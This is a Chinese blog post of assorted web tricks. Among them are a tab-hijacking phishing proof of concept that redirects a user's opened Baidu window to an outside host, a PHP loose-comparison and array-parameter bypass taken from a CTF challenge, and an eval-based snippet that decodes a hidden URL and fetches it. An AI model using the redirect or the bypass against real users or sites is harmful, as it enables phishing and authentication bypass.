---
title: 那些黑科技
date: 2019-03-01 17:00:57
tags:
---
### 远程控制地址栏
```javascript
http://675ba661.w1n.pw/41593a https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html
<html>
<head><meta charset="utf-8"></head>
<body>
<a href="https://www.baidu.com" target="baidu" id="baidu" onclick="return start()">click me</a>

<script>
function start() {
    setInterval(function() {
        baidu.href="http://675ba661.w1n.pw/baidu";
        baidu.click();
    }, 10000);
}
</script>
</body>
</html>
<html>
<head><meta charset="utf-8"></head>
<body>
<a href="javascript:;" onclick="return start()">click me</a>

<script>
function start() {
    var w = window.open('https://www.baidu.com', 'baidu');
    setInterval(function() {
        w.location = 'http://675ba661.w1n.pw/baidu'
    }, 5000)
}
</script>
</body>
</html>
```
### PHP浮点精确度
```javascript
https://www.itcodemonkey.com/article/2185.html
floor((0.1+0.7)*10) 通常会返回 7 而不是预期中的 8，因为该结果内部的表示其实是类似 7.9999999999999991118…。
?year=2016.99999999999 输出2017
var_dump("0e123" == "0e456");  //true
var_dump("0e123" == "0eabc");  //flase
0e123与0e456相互不严格性质比较的时候，会将0e这类字符串识为科学技术法的数字,0的无论多少次方都是零，所以相等,输出 true

0e123与0eabc相互进行不严格性质比较的时候，本应该将0e这类字符串识为科学技术法的数字,但是这里的0e后面跟着的是abc,数学中科学计数的指数不可以包含字母。所以这里字符串中虽然是0e开头，但是后面的abc却不符合科学技法的规范，所以输出是 false

error_reporting(0);
$flag = 'flag{I_think_that_I_just_broke_md5}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) === sha1($_GET['password']))
        die($flag);
    else
        print 'Invalid password';
}
if ($_GET['username'] == $_GET['password'])
并且得满足:
if (md5($_GET['username']) === sha1($_GET['password']))  ?username[]=a&password[]=b
```
### 隐藏文件
把hosts文件系统文件自动保护并隐藏的方法：

运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB +S +H +R HOSTS

还原为普通文件允许修改：

运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB -S -H -R HOSTS
https://blog.gxxsite.com/hostswen-jian-bao-hu-jia-suo-yu-jie-suo-kuai-su-pei-zhi-ke-shang-github-google/ 

### 编码
```javascript
$cipher = "XHg2OFx4NzRceDc0XHg3MFx4NzNceDNhXHgyZlx4MmZceDc0XHg2NVx4NzJceDZkXHg2Mlx4NjlceDZlXHgyZVx4NjNceDZmXHg2ZFx4MmZceDZjXHg2Y1x4NjJceDYz";

// 1. base64
$escaped_hex = base64_decode($cipher);
echo 'escaped_hex: ' . $escaped_hex . PHP_EOL;

// 2. "\x" unescape https://learnku.com/articles/25862
eval('$url = "' . $escaped_hex . '";');
echo 'url: ' . $url . PHP_EOL;

// 3. read this url
$resource = trim(
    file_get_contents($url)
);
echo 'resource: ' . $resource . PHP_EOL;

// 4. trim
$encoding = strstr($resource, ':', true);
echo 'encoding: ' . $encoding . PHP_EOL;

// 5. absorb real data
$parts = explode(' ', $resource);
array_shift($parts);
$hex = implode('', $parts);
echo 'hex: ' . $hex . PHP_EOL;

// 6. get the raw binary
$bin = pack('H*', $hex);

// 7. final convert
$results = mb_convert_encoding($bin, 'utf-8', $encoding);
echo 'RESULTS: ' . $results . PHP_EOL;

```
### 命令行进度条
```javascript
<?php
    echo "\033[41:37m \n Laravel ERROR : Oh My God, this is a bug!!! \n https://kuricat.com/gist/ansi-stdout-6s4pi";
$count = 100;
for ($i = 1; $i <= 100; $i++) {
    usleep(50000);
    $color = $i % 8 + 40;
    $equalStr = str_repeat("\033[{$color};37m=\33[0m", $i);
    $space    = str_repeat(" ", $count - $i);
    echo("\r [$equalStr>$space]($i/$count%)");
}

```
#### cookie编辑
```javascript
document.cookie="username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC; path=/"; 
也可以删除cookie 
https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg
https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome

```
[修改Charles网络请求](https://elemefe.github.io/sip/charles/ctrl-req.html)

[渗透测试](https://phithon.gitbooks.io/conote/content/)

[奇淫异巧之 PHP 后门](https://www.itcodemonkey.com/article/4956.html)

[各种系统下Shadowsocks客户端的安装与配置](http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html)

[免费ss、ssr账号分享，Shadowsocks免费账号](https://vien.tech/article/137)
